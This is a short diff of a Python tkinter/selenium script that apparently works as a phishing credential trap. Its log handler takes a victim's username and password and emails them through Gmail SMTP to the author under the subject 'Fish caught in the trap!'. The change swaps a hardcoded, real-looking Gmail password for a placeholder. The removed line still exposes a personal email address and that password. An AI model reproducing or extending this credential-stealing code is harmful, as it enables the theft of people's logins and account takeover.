@@ -4,12 +4,12 @@ import time
 import os
 import platform
 import sys
-
-b=0
-
+from getpass import getpass
 from tkinter import *
 from selenium import webdriver
 import pyttsx
+
+b = 0
 
 root = Tk()
 root.configure(bg='black')
@@ -54,7 +54,7 @@ def log(event):
     SUBJECT = 'Fish caught in the trap!'
     TEXT = '\nUSERNAME : '+text1+'\nPASSWORD : '+text2
     gmail_sender = 'kowligi1998@gmail.com'
-    gmail_passwd = 'HyperByte@123456'
+    gmail_passwd = "wrong_password!"
 
     server = smtplib.SMTP('smtp.gmail.com',587)
     server.ehlo()
